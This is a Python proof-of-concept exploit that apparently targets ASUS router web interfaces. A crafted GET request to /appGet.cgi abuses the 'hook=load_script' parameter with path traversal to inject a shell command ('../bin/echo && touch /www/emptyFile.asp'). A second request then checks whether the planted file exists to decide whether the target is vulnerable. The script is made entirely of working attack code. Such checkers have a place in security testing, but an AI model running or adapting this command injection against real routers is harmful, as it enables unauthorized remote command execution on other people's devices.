#!/usr/bin/env python3
import socket
import sys
import time

HOST = sys.argv[1]
PORT = 80
if len(sys.argv) > 2 :
  PORT = int(sys.argv[2])


def header(cookie_expected=False):
  buff = ""
  buff += "Host: {}:{}\r\n".format(HOST, PORT)
  buff += "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n"
  buff += "Referer: http://{}:{}/\r\n".format(HOST, PORT)
  buff += "Accept: application/json, text/javascript, */*; q=0.01\r\n"
  buff += "Accept-Language: en-US,en;q=0.5\r\n"
  buff += "Accept-Encoding: gzip, deflate\r\n"
  buff += "X-Requested-With: XMLHttpRequest\r\n"
  if cookie_expected :
    cookie = "asus_token=AAAAAAAAAAA"
    buff += "Cookie: {}\r\n".format(cookie)
  buff += "Connection: close\r\n"
  buff += "\r\n"
  return buff


def req1(cookie_expected=False):
  buff = ""
  buff += "GET /appGet.cgi?hook=load_script(\"../bin/echo%20%26%26%20touch%20/www/emptyFile.asp\") HTTP/1.1\r\n"
  buff += header(cookie_expected)
  return buff


def req2(cookie_expected=False):
  buff = ""
  buff += "GET /emptyFile.asp HTTP/1.1\r\n"
  buff += header(cookie_expected)
  return buff


try :
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  s.send(req1().encode())
  time.sleep(2)
  body = s.recv(4096).decode()
  print(body)
  s.send(req2().encode())
  time.sleep(2)
  body = s.recv(4096).decode()
  if " 200 OK" not in body :
    print("[x] Good, target isn't vulnerable")
  else :
    print("[+] Target is vulnerable")
  s.close()
  print("Done")
except Exception as ex:
  print(ex.args[0])



